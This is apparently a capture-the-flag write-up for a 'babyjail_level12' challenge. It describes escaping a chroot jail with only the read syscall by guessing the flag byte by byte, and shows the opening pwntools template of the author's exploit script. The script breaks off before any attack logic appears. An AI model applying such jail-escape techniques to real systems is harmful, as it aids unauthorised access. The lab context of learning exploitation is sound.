This challenge was asbolutely insane, but i think that what makes it so fun to solve. In this challenge we are asked to escape a chroot jail using only the read syscall.

This seems impossible to do but python can help us a great deal to achieve this task.

Since the program open whatever file we give to it in `argv[1]` we can call read on the resulting file descriptor of the read call and read the flag anywhere you want in this binary (must be a writable section of memory). 

Then all you need to do is write a python script that checks if this current byte of the flag is equal to `0x0` if it's not we increase the value until it's the right one and so on.

I achieve this by using the following python script (sorry for the mess).
```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babyjail_level12
from pwn import *
import os

# Set up pwntools for the correct architecture
exe = context.binary = ELF('/challenge/babyjail_level12')
context.log_level = "error"
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=["/flag"], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())
